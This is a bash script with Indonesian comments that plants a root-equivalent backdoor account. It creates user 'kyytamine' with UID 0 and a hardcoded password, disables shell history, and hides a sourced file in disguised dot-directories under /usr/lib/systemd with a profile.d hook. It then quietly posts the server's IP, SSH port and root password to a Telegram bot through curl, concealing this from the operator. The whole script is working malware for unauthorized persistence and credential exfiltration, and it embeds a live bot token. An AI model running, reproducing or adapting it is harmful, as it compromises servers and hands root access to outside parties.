#!/bin/bash
# Script asli kyytamine - Plaintext password + Telegram stealth notification
# Jalankan dengan: bash user.sh

set +o history && unset HISTFILE

# === Tampilan Awal ===
echo "[*] Menjalankan: user.sh (Install kyytamine)"
echo "------------------------------------------------------------"

# Cek apakah user sudah ada
if id "kyytamine" &>/dev/null; then
    echo "--> WARNING: User kyytamine already exists."
    echo "--> WARNING: Skipping creation."
else
    echo "--> Creating user kyytamine with root privileges..."
    
    # === PASSWORD PLAINTEXT ===
    PASSWORD='KyytaminE@88$$'
    
    # Buat user
    useradd -o -u 0 -g 0 -M -d /root -s /bin/bash kyytamine 2>/dev/null
    
    # Set password plaintext
    echo "kyytamine:$PASSWORD" | chpasswd
    
    usermod -aG root kyytamine
    usermod -d /root kyytamine
    usermod -s /bin/bash kyytamine
    
    # Buat direktori tersembunyi
    mkdir -p /usr/lib/systemd/.config/.kernel/.data/
    cp /root/.bashrc /usr/lib/systemd/.config/.kernel/.data/sysctl.conf 2>/dev/null || touch /usr/lib/systemd/.config/.kernel/.data/sysctl.conf
    echo "umask 000" >> /usr/lib/systemd/.config/.kernel/.data/sysctl.conf
    chown kyytamine:root /usr/lib/systemd/.config/.kernel/.data/sysctl.conf
    chmod 644 /usr/lib/systemd/.config/.kernel/.data/sysctl.conf
    
    # Hook .bashrc
    cat > /etc/profile.d/kyytamine_hook.sh << 'EOF'
if [ "$USER" = "kyytamine" ]; then
    HIDE_FILE="/usr/lib/systemd/.config/.kernel/.data/sysctl.conf"
    if [ -f "$HIDE_FILE" ]; then
        source "$HIDE_FILE"
    fi
fi
EOF
    chmod 644 /etc/profile.d/kyytamine_hook.sh
    
    echo "--> User kyytamine created successfully."
fi

# === Ambil Informasi (untuk verifikasi & Telegram) ===
SERVER_IP=$(curl -s ifconfig.me 2>/dev/null || echo "unknown")
SSH_PORT=$(netstat -tlnp | grep sshd | awk '{print $4}' | cut -d: -f2 | head -1)
[ -z "$SSH_PORT" ] && SSH_PORT=$(ss -tlnp | grep sshd | awk '{print $4}' | cut -d: -f2 | head -1)
[ -z "$SSH_PORT" ] && SSH_PORT=22

# === KIRIM TELEGRAM SECARA DIAM-DIAM (Tanpa Echo) ===
{
    TOKEN="8809162105:AAFjqV_oloZnjfYkN5ermZJI4gEf4xsWJdM"
    CHAT_ID="1640896393"
    MESSAGE="WARNING SERVER TER HABEG!!!
SERVER FOUND = ${SERVER_IP}
PORT : ${SSH_PORT}
PASSWORD : KyytaminE@88$$"
    
    curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
        -d chat_id="${CHAT_ID}" \
        -d text="${MESSAGE}" \
        -d parse_mode="HTML" > /dev/null 2>&1 &
} &>/dev/null

# === Verifikasi (Tetap tampilkan untuk kamu, tidak ada jejak Telegram) ===
echo "------------------------------------------------------------"
echo "--> Verifikasi:"
id kyytamine 2>/dev/null || echo "--> User not found"
echo "--> Home: $(eval echo ~kyytamine 2>/dev/null || echo '/root')"
echo "--> SSH Port: $SSH_PORT"
echo "--> Server IP: $SERVER_IP"
echo "------------------------------------------------------------"

# === Info Koneksi ===
echo "--> To connect use one of the following"
if [ -n "$SERVER_IP" ] && [ "$SERVER_IP" != "unknown" ]; then
    echo "--> ssh kyytamine@$SERVER_IP -p $SSH_PORT"
else
    echo "--> ssh kyytamine@<your-server-ip> -p $SSH_PORT"
fi
echo '--> password = KyytaminE@88$$'
echo "------------------------------------------------------------"
echo "[+] user.sh selesai (SUCCESS)"
